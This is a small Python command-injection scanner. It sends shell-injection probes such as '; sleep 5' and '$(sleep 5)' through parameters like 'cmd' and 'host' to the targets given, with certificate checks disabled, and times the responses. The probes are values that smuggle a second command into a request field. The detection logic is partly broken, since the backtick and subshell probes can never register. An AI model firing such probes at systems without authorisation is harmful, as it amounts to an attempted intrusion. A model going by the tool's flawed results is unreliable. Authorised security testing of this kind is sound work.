#!/usr/bin/env python3
print('[CMDi Scanner - Command Injection Detection]')
import requests, sys, os, time
requests.packages.urllib3.disable_warnings()

BANNER = '''
CMDi Scanner - Command Injection
Detects: OS command injection via time-based and output-based techniques
'''

CMDI_PAYLOADS = [
    ("; sleep 5", "sleep"),
    ("| ping -c 5 127.0.0.1", "ping"),
    ("`sleep 5`", "backtick"),
    ("$(sleep 5)", "subshell"),
    ("& ping -n 5 127.0.0.1 &", "windows"),
]

def scan_cmdi(target):
    base = f"https://{target}" if not target.startswith("http") else target
    base = base.rstrip("/")
    results = {"target": target, "vulnerable": False, "findings": []}
    params = ["cmd", "command", "exec", "ping", "host", "ip", "traceroute", "domain"]
    
    for param in params:
        for payload, name in CMDI_PAYLOADS:
            try:
                start = time.time()
                r = requests.get(f"{base}?{param}={requests.utils.quote(payload)}", timeout=15, verify=False)
                elapsed = time.time() - start
                if elapsed > 4.5 and "sleep" in name:
                    results["vulnerable"] = True
                    results["findings"].append(f"[TIME-BASED] {param}={name} ({elapsed:.1f}s)")
            except: pass
    return results

def main():
    print(BANNER)
    if len(sys.argv) < 2:
        print("Usage: python3 cmdi_scanner.py <target|file>")
        sys.exit(1)
    targets = [sys.argv[1]] if not os.path.isfile(sys.argv[1]) else [l.strip() for l in open(sys.argv[1])]
    for t in targets:
        r = scan_cmdi(t)
        if r["vulnerable"]:
            print(f"[!!] {t}")
            for f in r["findings"]: print(f"     {f}")

if __name__ == "__main__":
    main()
